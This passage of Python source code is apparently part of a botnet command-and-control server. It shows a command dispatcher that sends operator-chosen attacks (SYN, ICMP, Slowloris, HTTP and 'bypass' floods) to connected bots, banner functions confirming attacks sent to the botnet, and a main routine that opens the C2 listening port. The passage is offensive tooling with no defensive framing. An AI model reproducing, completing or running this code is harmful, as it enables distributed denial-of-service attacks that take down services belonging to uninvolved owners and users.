                tcp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.MULTIDT': # TCP Junk (MULTI)
                tcp_multi(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.TCPSYN': # TCP Junk And Syn flooding
                tcpsyn(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.NULCEAR_ATTACKS': # make LAG in bot
                NULCEAR_ATTACKS(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.TCP_BYPASS': # TCP Junk (Random TCP Data)
                tcp_bypass(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.SYN': # SYN flood
                syn(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.SYN2': # SYN flood
                syn2(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.SYN3': # SYN flood
                syn3(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.SYN4': # SYN flood
                syn4(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.SYN5': # SYN flood
                syn5(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.STD': # Standard Internet Flood
                std(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.SLOW': # sloworis flooding
                slow_attack(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.ICMP': # Internet Control Message Protocol Flood
                icmp(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.ICMP2': # Internet Control Message Protocol Flood 2
                icmp2(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.ICMP3': # Internet Control Message Protocol Flood 3
                icmp3(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.ICMP4': # Internet Control Message Protocol Flood 4
                icmp4(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.HEX': # Specific HEXIDECIMAL Flood
                hex(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.RHEX': # Specific HEXIDECIMAL Flood
                rhex(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.CPUKILL': # CPUKILL Attack (Ramps up CPU)
                cpukill(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.HEXCPU': # CPUKILL Attack | HEX
                hexcpu(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.JUNK': # JUNK Flood
                junk(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.VSE': # VSE Flood
                vse(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.HTTP_5050': # HTTP Flood PORT 5050
                http(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.HTTP_GET': # HTTP Flood PORT ALL
                http_2(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.PYFLOODER': # HTTP Flood PORT ALL 2
                pyflooder(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.PYFLOODER2': # HTTP Flood PORT ALL 2
                pyflooder2(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.PYFLOODER_HELL': # HTTP Flood PORT ALL 2
                pyflooder_hell(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.PYFLOODER_HELL2': # HTTP Flood PORT ALL 2
                pyflooder_hell2(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.PHS': # HTTP Flood PORT ALL 2
                PYFLOODERHELLSOCKET(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.PYFLOODER3': # HTTP Flood PORT ALL 2
                pyflooder3(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.PYFLOODER_6K': # HTTP Flood PORT ALL 2
                pyflooder_l4_l7(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.RATE_ATTACK': # RATE FLOODING
                rate_attack(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.RATE_ATTACK2': # RATE FLOODING
                rate_attack2(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.HTTP_REQ': # HTTP Flood REQ
                http_req(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            else:
                send(client, Fore.RED + f'\x1b[3;31;40m{data} Invalid commands 📄!')
            send(client, prompt, False)
        except:
            break
    client.close()

screenedSuccessfully = """
        ╔════════════════════════════════════╗
        ║                                    ║
        ║        Successfully Screened       ║
        ║     ───────────────────────────    ║
        ║            ╔══════════╗            ║
        ╚════════════╣   LOGS   ╠════════════╝
                     ╚══════════╝
"""

def attack_sent3(ip, mode, secs, client):
    loadering(client)
    color_random = color()
    send(client, f"")
    for x in banner.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    message_flooding = f"""
╔═════════════════════════════ > _
        ! ! SEND CVE ! !
   ═════════════════════════
       IP {ip}
     MODE {mode}
     TIME {secs}
   ═════════════════════════
    </> </> </> </> </> </>
╚═════════════════════════════[ {len(bots)} botnet ] >_"""
    color_random = color()
    for x in message_flooding.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    send(client,f"\033[32mSuccessfully sent command cve 📃")

def attack_sent1(ip, port, secs, client):
    loadering(client)
    color_random = color()
    send(client, f"")
    for x in banner.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    message_flooding = f"""
╔═════════════════════════════ > _
       ! SEND ATTACKING !
   ═════════════════════════
       IP {ip}
     PORT {port}
     TIME {secs}
   ═════════════════════════
    </> </> </> </> </> </>
╚═════════════════════════════[ {len(bots)} botnet ] >_"""
    color_random = color()
    for x in message_flooding.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    send(client,f"\033[32mSuccessfully sent command 📃")

def attack_sent2(ip, port, secs, size, client):
    loadering(client)
    color_random = color()
    send(client, f"")
    for x in banner.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    message_flooding = f"""
╔══════════════════════════[ATTACKING SENDING] >_
    >_ SEND TO BOTNET >_
  ════════════════════════
    IP > {ip}
  PORT > {port}
  TIME > {secs}
  SIZE > {size}
  ════════════════════════
   </> </> </> </> </> </>
╚══════════════════════════[{len(bots)} botnet] >_"""

    for x in message_flooding.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    send(client,f"\033[32mSuccessfully sent command 📜")

def main():
    if len(sys.argv) != 2:
        print(f'Usage: screen python3 {sys.argv[0]} <C2 Port>')
        exit()
    port = sys.argv[1]
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('\x1b[3;31;40m Invalid C2 port')
        exit()
    port = int(port)
    init(convert=True)
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(screenedSuccessfully)
    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('\x1b[3;31;40m Failed to bind port')
        exit()
    sock.listen()
    threading.Thread(target=ping).start() # Start keepalive thread
    # Accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    try:
        main()
    except Exception:
        print('Error, skipping..')
